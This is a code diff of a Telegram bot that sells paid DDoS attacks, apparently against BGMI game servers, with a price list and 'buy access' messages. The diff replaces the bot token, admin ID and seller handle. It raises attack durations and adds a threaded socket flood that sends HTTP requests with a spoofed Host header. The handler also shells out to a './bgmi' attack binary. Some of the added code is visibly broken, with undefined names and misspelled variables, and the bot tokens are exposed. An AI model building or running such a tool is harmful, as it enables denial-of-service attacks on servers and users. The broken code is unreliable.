@@ -4,14 +4,16 @@ import telebot
 import subprocess
 import datetime
 import os
+import socket
+import threading
 
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7201042924:AAER3LitjsPBcfmw7TmTnhOywNuNFUU2tgw')
+bot = telebot.TeleBot('6995858099:AAGHnu5Ir-_rNFL7xpt3QPZD8YH5BvZDSUE')
 
 # Admin user IDs
-admin_id = ["1185995156"]
+admin_id = ["1791540109"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -48,7 +50,7 @@ allowed_user_ids = read_users()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
-    admin_id = ["1185995156"]
+    admin_id = ["1791540109"]
     user_info = bot.get_chat(user_id)
     if user_info.username:
         username = "@" + user_info.username
@@ -189,7 +191,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>😘'''
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @BgmiOPbotYT ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Sh1327 ❄."
 
     bot.reply_to(message, response)
 
@@ -208,7 +210,7 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ❌."
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @@BgmiOPbotYT ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Sh1327 ❄."
     bot.reply_to(message, response)
 
 
@@ -227,7 +229,7 @@ def clear_users_command(message):
         except FileNotFoundError:
             response = "users are already cleared ❌."
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @BgmiOPbotYT ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Sh1327 ❄."
     bot.reply_to(message, response)
  
 
@@ -252,7 +254,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found ❌"
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @BgmiOPbotYT ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Sh1327 ❄."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['logs'])
@@ -270,7 +272,7 @@ def show_recent_logs(message):
             response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @BgmiOPbotYT ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Sh1327 ❄."
         bot.reply_to(message, response)
 
 
@@ -279,7 +281,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- @BgmiOPbotYT KA KALA JADU"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- @Sh1327 Paid hack"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -295,12 +297,12 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+            if user_id in bgmi_cooldown and (datime.datetime.now() - bgmi_cooldown[er_id]).seconds < COOLDOWN_TIME:
                 response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
+            bgmi_cooldown[ur_id] = datime.datetime.now()
         
         command = message.text.split()
         if len(command) == 4:  # Updated to accept target, time, and port
@@ -313,14 +315,38 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+
+
+                full_command = f"./bgmi {target} {port} {time} 900"
+
                 process = subprocess.run(full_command, shell=True)
+                for i in range(500):
+                        thread = threading.Thread(target=bgmi)
+                        thread.start()
+                        attack_num = 50000
+
+                        def attack():
+                            while True:
+                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                s.connect((target, port))
+                                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+                                                        
+                                            
+                                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+                                                                                                                                                                                                                                                                                                                                                    
+                                global attack_num
+                                attack_num += 50000000
+                                print(attack_num)
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+                                s.close()
+
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
+        
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @BgmiOPbotYT")
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @Sh1327")
 
     bot.reply_to(message, response)
 
@@ -357,8 +383,8 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @BgmiOPbotYT
-Official Channel :- https://t.me/+VmEf2CuM6ogxNjBI
+Buy From :- @Sh1327
+Official Channel :- https://t.me/bgmihacksh
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -375,7 +401,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
 🤖Try To Run This Command : /help 
-✅BUY :- @BgmiOPbotYT'''
+✅BUY :- @Sh1327'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -385,7 +411,7 @@ def welcome_rules(message):
 
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-3. MAKE SURE YOU JOINED https://t.me/+VmEf2CuM6ogxNjBI OTHERWISE NOT WORK
+3. MAKE SURE YOU JOINED https://t.me/bgmihacksh OTHERWISE NOT WORK
 4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
@@ -395,13 +421,13 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 300 (S)
+-> Attack Time : 600 (S)
 > After Attack Limit : 10 sec
 -> Concurrents Attack : 5
 
 Pr-ice List💸 :
-Day-->80 Rs
-Week-->400 Rs
+Day-->100 Rs
+Week-->450 Rs
 Month-->1000 Rs
 '''
     bot.reply_to(message, response)
